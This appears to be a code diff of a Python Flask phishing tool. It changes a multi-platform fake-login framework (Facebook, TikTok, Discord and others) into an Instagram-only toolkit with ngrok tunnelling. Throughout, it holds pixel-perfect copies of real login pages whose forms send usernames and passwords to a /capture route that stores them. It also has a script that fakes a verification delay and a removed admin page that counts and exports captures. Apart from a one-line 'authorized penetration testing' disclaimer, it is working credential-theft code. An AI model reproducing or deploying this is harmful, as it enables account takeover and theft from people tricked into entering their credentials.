@@ -1,460 +1,394 @@
 #!/usr/bin/env python3
 """
-Social Media Phishing Framework v2.0
+Instagram Phishing Toolkit v1.0
 For authorized penetration testing only
-Supports: Facebook, Instagram, Twitter/X, LinkedIn, TikTok, Snapchat, Discord, Reddit
+Includes ngrok auto-configuration
 
-Usage: python3 social_phisher.py
+Usage: python3 instagram_phisher.py
 """
 
-from flask import Flask, request, render_template_string, session, redirect, url_for
-import json, os, time, hashlib, base64, requests, threading, sys
+from flask import Flask, request, render_template_string, redirect, jsonify
+import json, os, time, hashlib, threading, subprocess, requests as req
 from datetime import datetime
-from urllib.parse import urlparse
 
 app = Flask(__name__)
 app.secret_key = os.urandom(64).hex()
 
 # ============================================================
-# PLATFORM TEMPLATES
+# CONFIGURATION
 # ============================================================
-
-PLATFORMS = {
-    "facebook": {
-        "name": "Facebook",
-        "color": "#1877F2",
-        "logo": "https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5VTIdbGQM.svg",
-        "fields": ["email", "pass"],
-        "field_labels": ["Email or Phone", "Password"],
-        "bg_color": "#f0f2f5",
-        "button_text": "Log In",
-        "extra_link": "Forgotten password?",
-        "signup_link": "Create new account",
-    },
-    "instagram": {
-        "name": "Instagram",
-        "color": "#0095F6",
-        "logo": "https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png",
-        "fields": ["username", "password"],
-        "field_labels": ["Phone number, username or email", "Password"],
-        "bg_color": "#ffffff",
-        "button_text": "Log In",
-        "extra_link": "Forgot password?",
-        "signup_link": "Create new account",
-    },
-    "twitter": {
-        "name": "X / Twitter",
-        "color": "#000000",
-        "logo": "https://abs.twimg.com/favicons/twitter.ico",
-        "fields": ["text", "password"],
-        "field_labels": ["Phone, email or username", "Password"],
-        "bg_color": "#ffffff",
-        "button_text": "Next",
-        "extra_link": "Forgot password?",
-        "signup_link": "Sign up for X",
-    },
-    "linkedin": {
-        "name": "LinkedIn",
-        "color": "#0A66C2",
-        "logo": "https://static.licdn.com/sc/h/95o6rrc5q6j1ekq8c6e8b3i7",
-        "fields": ["session_key", "session_password"],
-        "field_labels": ["Email or phone", "Password"],
-        "bg_color": "#f3f2f0",
-        "button_text": "Sign in",
-        "extra_link": "Forgot password?",
-        "signup_link": "Join now",
-    },
-    "tiktok": {
-        "name": "TikTok",
-        "color": "#FE2C55",
-        "logo": "https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/images/logo.svg",
-        "fields": ["username", "password"],
-        "field_labels": ["Email or username", "Password"],
-        "bg_color": "#ffffff",
-        "button_text": "Log In",
-        "extra_link": "Forgot password?",
-        "signup_link": "Sign up",
-    },
-    "snapchat": {
-        "name": "Snapchat",
-        "color": "#FFFC00",
-        "logo": "https://www.snapchat.com/favicon.ico",
-        "fields": ["username", "password"],
-        "field_labels": ["Username or email", "Password"],
-        "bg_color": "#ffffff",
-        "button_text": "Log In",
-        "extra_link": "Forgot your password?",
-        "signup_link": "Sign Up",
-    },
-    "discord": {
-        "name": "Discord",
-        "color": "#5865F2",
-        "logo": "https://discord.com/assets/favicon.ico",
-        "fields": ["email", "password"],
-        "field_labels": ["Email", "Password"],
-        "bg_color": "#313338",
-        "button_text": "Log In",
-        "extra_link": "Forgot password?",
-        "signup_link": "Register",
-    },
-    "reddit": {
-        "name": "Reddit",
-        "color": "#FF4500",
-        "logo": "https://www.redditstatic.com/desktop2x/img/favicon/favicon-96x96.png",
-        "fields": ["loginUsername", "loginPassword"],
-        "field_labels": ["Username", "Password"],
-        "bg_color": "#dae0e6",
-        "button_text": "Log In",
-        "extra_link": "Forgot password?",
-        "signup_link": "Sign Up",
-    },
-    "whatsapp": {
-        "name": "WhatsApp Web",
-        "color": "#25D366",
-        "logo": "https://static.whatsapp.net/rsrc.php/v3/y7/r/DSxOAUB0uA7.png",
-        "fields": ["phone", "password"],
-        "field_labels": ["Phone number", "Password"],
-        "bg_color": "#eae6df",
-        "button_text": "Log In",
-        "extra_link": "Forgot password?",
-        "signup_link": "Create account",
-    },
-    "telegram": {
-        "name": "Telegram",
-        "color": "#0088cc",
-        "logo": "https://telegram.org/img/t_logo.svg",
-        "fields": ["phone", "password"],
-        "field_labels": ["Phone number", "Password"],
-        "bg_color": "#e8f3f8",
-        "button_text": "Next",
-        "extra_link": "Forgot password?",
-        "signup_link": "Create account",
-    }
+CONFIG = {
+    "port": 5000,
+    "ngrok_token": "",  # Add your ngrok auth token here
+    "data_file": "instagram_captures.json",
+    "redirect_url": "https://www.instagram.com",
+    "theme_color": "#0095F6",
+    "theme_bg": "#ffffff"
 }
 
 # ============================================================
-# PHISHING PAGE TEMPLATE (Mobile-Responsive, Pixel-Perfect)
+# PIXEL-PERFECT INSTAGRAM LOGIN PAGE
 # ============================================================
 
-PHISH_TEMPLATE = """
+INSTAGRAM_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>{{ platform }}</title>
+    <title>Instagram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: {{ bg_color }};
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-        }
-        .card {
-            background: white;
-            border-radius: {{ '0' if platform_name == 'Instagram' else '8px' }};
-            padding: {{ '20px 40px' if platform_name != 'Instagram' else '20px' }};
-            box-shadow: {{ 'none' if platform_name in ['Instagram', 'TikTok'] else '0 2px 10px rgba(0,0,0,0.1)' }};
-            text-align: center;
-            border: {{ '1px solid #dbdbdb' if platform_name == 'Instagram' else 'none' }};
-        }
-        .logo {
-            width: {{ '50px' if platform_name == 'X / Twitter' else 'auto' }};
-            height: auto;
-            max-width: 200px;
-            max-height: 80px;
-            margin: 20px auto;
-            display: block;
-            object-fit: contain;
-        }
-        .logo-container {
-            margin: {{ '30px 0 20px' if platform_name == 'Discord' else '20px 0' }};
-        }
-        h2 {
-            color: {{ '#f2f3f5' if platform_name == 'Discord' else '#333' }};
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            margin-bottom: 12px;
-            text-align: left;
-        }
-        .input-group input {
-            width: 100%;
-            padding: {{ '14px' if platform_name in ['Instagram', 'LinkedIn', 'TikTok'] else '12px' }};
-            border: 1px solid {{ '#dbdbdb' if platform_name == 'Instagram' else '#ddd' }};
-            border-radius: {{ '3px' if platform_name == 'Instagram' else '6px' }};
-            font-size: {{ '16px' if platform_name == 'Instagram' else '14px' }};
-            background: {{ '#fafafa' if platform_name == 'Instagram' else 'white' }};
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .input-group input:focus {
-            border-color: {{ color }};
-            {% if platform_name == 'Instagram' %}
-            background: #fff;
-            {% endif %}
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 14px;
-            color: {{ '#b5bac1' if platform_name == 'Discord' else '#606770' }};
-            font-weight: 500;
-        }
-        .btn {
-            width: 100%;
-            padding: {{ '12px' if platform_name != 'Instagram' else '8px' }};
-            background: {{ color }};
-            color: {{ '#000' if platform_name == 'Snapchat' else 'white' }};
-            border: none;
-            border-radius: {{ '8px' if platform_name != 'Instagram' else '4px' }};
-            font-size: {{ '16px' if platform_name != 'Instagram' else '14px' }};
-            font-weight: {{ '600' if platform_name == 'Facebook' else 'bold' }};
-            cursor: pointer;
-            margin-top: 10px;
-            opacity: {{ '0.7' if platform_name == 'Instagram' else '1' }};
-        }
-        .btn:hover {
-            opacity: 1;
-            {% if platform_name == 'Facebook' %}
-            background: #166FE5;
-            {% endif %}
-        }
-        .extra-link {
-            display: block;
-            margin-top: 15px;
-            font-size: 13px;
-            color: {{ '#1877F2' if platform_name == 'Facebook' else '#00376b' if platform_name == 'Instagram' else '#1d9bf0' if platform_name == 'X / Twitter' else '#0A66C2' if platform_name == 'LinkedIn' else '#8e8e8e' if platform_name == 'TikTok' else '#00a2ed' if platform_name == 'Snapchat' else '#00aff4' if platform_name == 'Telegram' else '#00a5f4' if platform_name == 'WhatsApp' else '#00b0f4' if platform_name == 'Discord' else '#0079d3' if platform_name == 'Reddit' else '#0088cc' }};
-            text-decoration: none;
-        }
-        .extra-link:hover {
-            text-decoration: underline;
-        }
-        .divider {
-            margin: 20px 0;
-            display: flex;
-            align-items: center;
-            color: #999;
-            font-size: 13px;
-        }
-        .divider::before, .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #ddd;
-        }
-        .divider::before { margin-right: 10px; }
-        .divider::after { margin-left: 10px; }
-        .signup-link {
-            display: block;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #666;
-            text-decoration: none;
-        }
-        .signup-link a {
-            color: {{ color }};
-            font-weight: 600;
-            text-decoration: none;
-        }
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: {{ '#8e8e8e' if platform_name == 'Instagram' else '#999' }};
-            text-align: center;
-        }
-        .footer a {
-            color: inherit;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .error-msg {
-            color: #ed4956;
-            font-size: 13px;
-            margin-bottom: 10px;
-            display: none;
-        }
-        .loading {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid {{ color }};
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .checkbox-group {
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            animation: fadeIn 0.5s ease-out;
+        }
+        .card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 30px 40px 20px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo {
+            margin: 22px auto 12px;
+            display: block;
+        }
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+        form {
+            margin-top: 24px;
+        }
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            background: #fafafa;
+            outline: none;
+            transition: all 0.2s;
+            color: #262626;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+        .input-group input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        .input-group input:focus::placeholder {
+            color: #c0c0c0;
+        }
+        .btn {
+            width: 100%;
+            padding: 7px 16px;
+            background: #0095F6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            opacity: 0.7;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            opacity: 1;
+        }
+        .btn:active {
+            opacity: 0.9;
+            transform: scale(0.99);
+        }
+        .btn.loading {
+            background: #0095F660;
+            pointer-events: none;
+        }
+        .divider {
+            margin: 18px 0;
             display: flex;
             align-items: center;
-            margin: 10px 0;
+            color: #8e8e8e;
             font-size: 13px;
-            color: #666;
+            font-weight: 600;
         }
-        .checkbox-group input {
-            margin-right: 8px;
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider::before { margin-right: 18px; }
+        .divider::after { margin-left: 18px; }
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+        .fb-login svg {
+            width: 16px;
+            height: 16px;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .signup-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-card a {
+            color: #0095F6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup-card a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .get-app p {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 16px;
+        }
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .app-badges img {
+            height: 40px;
         }
         .meta-footer {
             margin-top: 20px;
             padding: 20px 0;
             text-align: center;
             font-size: 12px;
-            color: #8a8d91;
+            color: #8e8e8e;
         }
         .meta-footer a {
-            color: #8a8d91;
+            color: #8e8e8e;
             text-decoration: none;
-            margin: 0 10px;
+            margin: 0 8px;
         }
         .meta-footer a:hover {
             text-decoration: underline;
         }
-        @media (max-width: 480px) {
-            .container { padding: 10px; }
-            .card { padding: 15px; border-radius: 0; box-shadow: none; }
+        .error-msg {
+            background: #fdecea;
+            color: #c62828;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid white;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto;
+        }
+        @media (max-width: 450px) {
+            body { padding: 0; background: white; }
+            .container { max-width: 100%; }
+            .card { border: none; padding: 20px; }
+            .signup-card { border: none; }
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Login Card -->
         <div class="card">
-            <div class="logo-container">
-                <img src="{{ logo }}" class="logo" alt="{{ platform_name }}">
+            <!-- Instagram Logo -->
+            <div class="logo">
+                <svg viewBox="0 0 175 39" fill="#262626">
+                    <path d="M16.3 6.8c-5.2 0-9.4 4.2-9.4 9.4s4.2 9.4 9.4 9.4 9.4-4.2 9.4-9.4-4.2-9.4-9.4-9.4zm0 15.5c-3.4 0-6.1-2.7-6.1-6.1s2.7-6.1 6.1-6.1 6.1 2.7 6.1 6.1-2.7 6.1-6.1 6.1zm11.9-15.9c0 1.2-1 2.2-2.2 2.2s-2.2-1-2.2-2.2 1-2.2 2.2-2.2 2.2 1 2.2 2.2zm6.6 2.2c-.1-2.5-.7-4.8-2.5-6.5-1.8-1.8-4-2.4-6.5-2.5-2.6-.1-10.4-.1-13 0-2.5.1-4.8.7-6.5 2.5-1.8 1.8-2.4 4-2.5 6.5-.1 2.6-.1 10.4 0 13 .1 2.5.7 4.8 2.5 6.5 1.8 1.8 4 2.4 6.5 2.5 2.6.1 10.4.1 13 0 2.5-.1 4.8-.7 6.5-2.5 1.8-1.8 2.4-4 2.5-6.5.1-2.6.1-10.4 0-13zM33.5 29.3c-.5 1.2-1.5 2.1-2.7 2.7-1.9.7-6.3.5-14.5.5s-12.6.2-14.5-.5c-1.2-.5-2.1-1.5-2.7-2.7-.7-1.9-.5-6.3-.5-14.5s-.2-12.6.5-14.5c.5-1.2 1.5-2.1 2.7-2.7 1.9-.7 6.3-.5 14.5-.5s12.6-.2 14.5.5c1.2.5 2.1 1.5 2.7 2.7.7 1.9.5 6.3.5 14.5s.2 12.6-.5 14.5z"/>
+                    <path d="M73.8 12.6h-4.5v-4.1c0-1.1.9-2 2-2h2.5V2.5h-3.9c-3.3 0-6 2.7-6 6v4.1h-2.9v3.9h2.9v14.7h4.5V16.5h3.7l.7-3.9zM87.3 10.7c-1.7 0-3.2.7-4.3 1.8l-.1-1.5h-4v19.2h4.5V19.5c0-2.1 1.7-3.8 3.8-3.8s3.8 1.7 3.8 3.8v10.8H96V18.8c-.1-4.5-3.7-8.1-8.7-8.1zM106.1 10.7c-4.2 0-7.6 3.4-7.6 7.6s3.4 7.6 7.6 7.6 7.6-3.4 7.6-7.6-3.4-7.6-7.6-7.6zm0 12.1c-2.5 0-4.5-2-4.5-4.5s2-4.5 4.5-4.5 4.5 2 4.5 4.5-2 4.5-4.5 4.5zM127.6 10.7c-1.7 0-3.2.7-4.3 1.8l-.1-1.5h-4v19.2h4.5V19.5c0-2.1 1.7-3.8 3.8-3.8s3.8 1.7 3.8 3.8v10.8H136V18.8c0-4.5-3.7-8.1-8.4-8.1zM157.1 14.7c-1.1-2.5-3.6-4.1-6.4-4.1-4.2 0-7.6 3.4-7.6 7.6s3.4 7.6 7.6 7.6c2.8 0 5.3-1.6 6.4-4.1l-3.9-1.7c-.5 1.2-1.7 2-3 2-1.6 0-3-.9-3.6-2.3l10.1-4.3-.6-.7zm-9.8 1.7c.2-1.8 1.7-3.2 3.5-3.2 1.3 0 2.5.7 3 1.9l-6.5 2.7v-1.4zM173.1 14.7c-1.1-2.5-3.6-4.1-6.4-4.1-4.2 0-7.6 3.4-7.6 7.6s3.4 7.6 7.6 7.6c2.8 0 5.3-1.6 6.4-4.1l-3.9-1.7c-.5 1.2-1.7 2-3 2-1.6 0-3-.9-3.6-2.3l10.1-4.3-.6-.7zm-9.8 1.7c.2-1.8 1.7-3.2 3.5-3.2 1.3 0 2.5.7 3 1.9l-6.5 2.7v-1.4z"/>
+                </svg>
             </div>
             
-            {% if platform_name == 'Discord' %}
-            <h2>Welcome back!</h2>
-            <p style="color: #b5bac1; font-size: 14px; margin-bottom: 20px;">We're so excited to see you again!</p>
-            {% endif %}
+            <!-- Error Message -->
+            <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
             
-            {% if platform_name == 'Facebook' %}
-            <h2 style="font-size: 18px; font-weight: normal; color: #1c1e21; margin-bottom: 20px;">Log in to Facebook</h2>
-            {% endif %}
-            
-            <form method="POST" action="/capture/{{ platform_key }}" id="loginForm">
-                {% for i in range(fields|length) %}
+            <!-- Login Form -->
+            <form method="POST" action="/capture" id="loginForm" autocomplete="off">
                 <div class="input-group">
-                    {% if platform_name == 'Discord' %}
-                    <label>{{ field_labels[i] }}</label>
-                    {% endif %}
-                    <input type="{{ 'password' if 'pass' in fields[i] else 'text' }}" 
-                           name="{{ fields[i] }}" 
-                           placeholder="{{ field_labels[i] }}" 
-                           {% if platform_name in ['Instagram', 'TikTok', 'Snapchat', 'Twitter', 'Reddit'] %}required{% endif %}>
+                    <input type="text" name="username" placeholder="Phone number, username or email" 
+                           autocorrect="off" autocapitalize="off" required>
                 </div>
-                {% endfor %}
-                
-                {% if platform_name == 'Facebook' %}
-                <div class="checkbox-group">
-                    <input type="checkbox" name="keep_login" checked> Keep me logged in
+                <div class="input-group">
+                    <input type="password" name="password" placeholder="Password" required>
                 </div>
-                {% endif %}
-                
-                {% if platform_name == 'Discord' %}
-                <div class="checkbox-group" style="color: #b5bac1;">
-                    <input type="checkbox" name="remember"> Keep me logged in
-                </div>
-                {% endif %}
-                
-                <button type="submit" class="btn">{{ button_text }}</button>
-                <div class="loading" id="loading"></div>
+                <button type="submit" class="btn" id="loginBtn">Log In</button>
+                <div class="spinner" id="spinner"></div>
             </form>
             
-            {% if extra_link %}
-            <a href="#" class="extra-link">{{ extra_link }}</a>
-            {% endif %}
+            <!-- Divider -->
+            <div class="divider">OR</div>
             
-            {% if platform_name in ['Facebook', 'Instagram', 'LinkedIn', 'TikTok', 'Snapchat', 'Discord', 'Reddit'] %}
-            <div class="divider">or</div>
-            {% endif %}
-            
-            {% if signup_link %}
-            <div class="signup-link">
-                {% if platform_name == 'Facebook' %}
-                <a href="#">{{ signup_link }}</a>
-                {% else %}
-                Don't have an account? <a href="#">{{ signup_link }}</a>
-                {% endif %}
+            <!-- Facebook Login -->
+            <div class="fb-login">
+                <svg viewBox="0 0 16 16" fill="#385185">
+                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
+                </svg>
+                Log in with Facebook
             </div>
-            {% endif %}
+            
+            <!-- Forgot Password -->
+            <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
         </div>
         
-        {% if platform_name == 'Instagram' %}
+        <!-- Sign Up Card -->
+        <div class="signup-card">
+            Don't have an account? <a href="#" onclick="return false;">Sign up</a>
+        </div>
+        
+        <!-- Get App -->
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc924.png" alt="Google Play">
+            </div>
+        </div>
+        
+        <!-- Footer -->
         <div class="footer">
-            <a href="#">Meta</a>
-            <a href="#">About</a>
-            <a href="#">Blog</a>
-            <a href="#">Jobs</a>
-            <a href="#">Help</a>
-            <a href="#">API</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Locations</a>
-            <a href="#">Instagram Lite</a>
-            <a href="#">Threads</a>
-            <a href="#">Contact Uploading & Non-Users</a>
-            <a href="#">Meta Verified</a>
+            <a href="#">Meta</a> · <a href="#">About</a> · <a href="#">Blog</a> · 
+            <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> · 
+            <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Locations</a> · 
+            <a href="#">Instagram Lite</a> · <a href="#">Threads</a> · 
+            <a href="#">Contact Uploading & Non-Users</a> · <a href="#">Meta Verified</a>
         </div>
         <div class="meta-footer">
-            <span>English</span>
-            <span>© 2026 Instagram from Meta</span>
-        </div>
-        {% endif %}
-        
-        {% if platform_name == 'Facebook' %}
-        <div class="meta-footer">
-            <a href="#">English (UK)</a>
-            <a href="#">Français (France)</a>
-            <a href="#">Español</a>
-            <a href="#">More languages...</a>
+            <a href="#">English</a> · <a href="#">Français (France)</a> · <a href="#">Español</a> · 
+            <a href="#">中文(简体)</a> · <a href="#">العربية</a> · <a href="#">Português (Brasil)</a> · 
+            <a href="#">Italiano</a> · <a href="#">한국어</a> · <a href="#">Deutsch</a> · 
+            <a href="#">日本語</a>
             <br><br>
-            <a href="#">Sign Up</a> · <a href="#">Log In</a> · <a href="#">Messenger</a> · 
-            <a href="#">Facebook Lite</a> · <a href="#">Video</a> · <a href="#">Places</a> · 
-            <a href="#">Games</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a> · 
-            <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Instagram</a> · 
-            <a href="#">Threads</a> · <a href="#">Fundraisers</a> · <a href="#">Services</a> · 
-            <a href="#">Voting Information Centre</a> · <a href="#">Privacy Policy</a> · 
-            <a href="#">Privacy Centre</a> · <a href="#">Groups</a> · <a href="#">About</a> · 
-            <a href="#">Create ad</a> · <a href="#">Create Page</a> · <a href="#">Developers</a> · 
-            <a href="#">Careers</a> · <a href="#">Cookies</a> · <a href="#">AdChoices</a> · 
-            <a href="#">Terms</a> · <a href="#">Help</a> · <a href="#">Contact uploading and non-users</a>
-            <br><br>
-            Meta © 2026
+            <span>English</span> · <span>© 2026 Instagram from Meta</span>
         </div>
-        {% endif %}
     </div>
     
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            var btn = this.querySelector('.btn');
-            var loading = document.getElementById('loading');
-            btn.style.display = 'none';
-            loading.style.display = 'block';
+            e.preventDefault();
             
-            // Simulate slight delay
+            var username = this.querySelector('input[name="username"]').value.trim();
+            var password = this.querySelector('input[name="password"]').value.trim();
+            var btn = document.getElementById('loginBtn');
+            var spinner = document.getElementById('spinner');
+            var errorMsg = document.getElementById('errorMsg');
+            
+            if (!username || !password) {
+                errorMsg.textContent = 'Please fill in all fields.';
+                errorMsg.style.display = 'block';
+                setTimeout(function() { errorMsg.style.display = 'none'; }, 3000);
+                return;
+            }
+            
+            // Show loading state
+            btn.textContent = '';
+            btn.classList.add('loading');
+            spinner.style.display = 'block';
+            errorMsg.style.display = 'none';
+            
+            // Simulate verification delay
             setTimeout(function() {
-                // Form submits normally
-            }, 500);
+                // Submit the form
+                var form = document.createElement('form');
+                form.method = 'POST';
+                form.action = '/capture';
+                
+                var input1 = document.createElement('input');
+                input1.type = 'hidden';
+                input1.name = 'username';
+                input1.value = username;
+                form.appendChild(input1);
+                
+                var input2 = document.createElement('input');
+                input2.type = 'hidden';
+                input2.name = 'password';
+                input2.value = password;
+                form.appendChild(input2);
+                
+                document.body.appendChild(form);
+                form.submit();
+            }, 1500);
         });
     </script>
 </body>
@@ -463,305 +397,109 @@ PHISH_TEMPLATE = """
 
 
 # ============================================================
-# ROUTES
+# FLASK ROUTES
 # ============================================================
 
 @app.route('/')
 def index():
-    """Main menu - list all available phishing pages"""
-    html = """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Social Media Phishing Framework</title>
-        <style>
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                background: #0f0f23;
-                color: #fff;
-                margin: 0;
-                padding: 40px;
-            }
-            .container { max-width: 900px; margin: 0 auto; }
-            h1 { color: #00ff88; font-size: 28px; margin-bottom: 5px; }
-            .subtitle { color: #888; margin-bottom: 30px; }
-            .grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-                gap: 15px;
-                margin-bottom: 30px;
-            }
-            .card {
-                background: #1a1a3e;
-                border-radius: 10px;
-                padding: 20px;
-                text-align: center;
-                transition: all 0.3s;
-                border: 1px solid #2a2a5e;
-            }
-            .card:hover {
-                transform: translateY(-3px);
-                border-color: #00ff88;
-                box-shadow: 0 5px 20px rgba(0,255,136,0.15);
-            }
-            .card img {
-                width: 48px;
-                height: 48px;
-                object-fit: contain;
-                margin-bottom: 10px;
-                border-radius: 8px;
-                background: white;
-                padding: 4px;
-            }
-            .card h3 { margin: 0 0 5px 0; font-size: 16px; }
-            .card .url {
-                font-size: 12px;
-                color: #00ff88;
-                background: #0f0f23;
-                padding: 4px 8px;
-                border-radius: 4px;
-                display: inline-block;
-                margin-top: 8px;
-                word-break: break-all;
-            }
-            .card .status {
-                font-size: 11px;
-                color: #888;
-                margin-top: 8px;
-            }
-            .stats {
-                display: flex;
-                gap: 20px;
-                margin-bottom: 30px;
-            }
-            .stat {
-                background: #1a1a3e;
-                border-radius: 10px;
-                padding: 15px 25px;
-                border: 1px solid #2a2a5e;
-            }
-            .stat .num {
-                font-size: 24px;
-                font-weight: bold;
-                color: #00ff88;
-            }
-            .stat .label {
-                font-size: 12px;
-                color: #888;
-            }
-            .dashboard-link {
-                display: inline-block;
-                margin-top: 20px;
-                padding: 12px 30px;
-                background: #00ff88;
-                color: #0f0f23;
-                text-decoration: none;
-                border-radius: 8px;
-                font-weight: bold;
-            }
-            .dashboard-link:hover { background: #00cc6a; }
-            .footer {
-                margin-top: 40px;
-                color: #555;
-                font-size: 12px;
-                text-align: center;
-            }
-            .badge {
-                display: inline-block;
-                background: #ff4444;
-                color: white;
-                font-size: 10px;
-                padding: 2px 6px;
-                border-radius: 10px;
-                margin-left: 5px;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>🎣 Social Media Phishing Framework</h1>
-            <p class="subtitle">Authorized Penetration Testing — All captured data is stored locally</p>
-            
-            <div class="stats">
-                <div class="stat">
-                    <div class="num">""" + str(len(PLATFORMS)) + """</div>
-                    <div class="label">Platforms</div>
-                </div>
-                <div class="stat">
-                    <div class="num">""" + str(get_total_captures()) + """</div>
-                    <div class="label">Total Captures</div>
-                </div>
-                <div class="stat">
-                    <div class="num" id="activeSessions">0</div>
-                    <div class="label">Active Sessions</div>
-                </div>
-            </div>
-            
-            <div class="grid">
-    """
-    
-    for key, platform in PLATFORMS.items():
-        captures = get_platform_captures(key)
-        html += f"""
-                <div class="card">
-                    <img src="{platform['logo']}" alt="{platform['name']}" 
-                         onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2248%22 height=%2248%22><rect width=%2248%22 height=%2248%22 fill=%22%23333%22/><text x=%2224%22 y=%2230%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2214%22>{platform['name'][0]}</text></svg>'">
-                    <h3>{platform['name']}</h3>
-                    <div class="url">/phish/{key}</div>
-                    <div class="status">{len(captures)} captures</div>
-                </div>
-        """
-    
-    html += """
-            </div>
-            
-            <a href="/dashboard" class="dashboard-link">📊 View Dashboard</a>
-            <a href="/export" class="dashboard-link" style="background: #4444ff; margin-left: 10px;">📥 Export All Data</a>
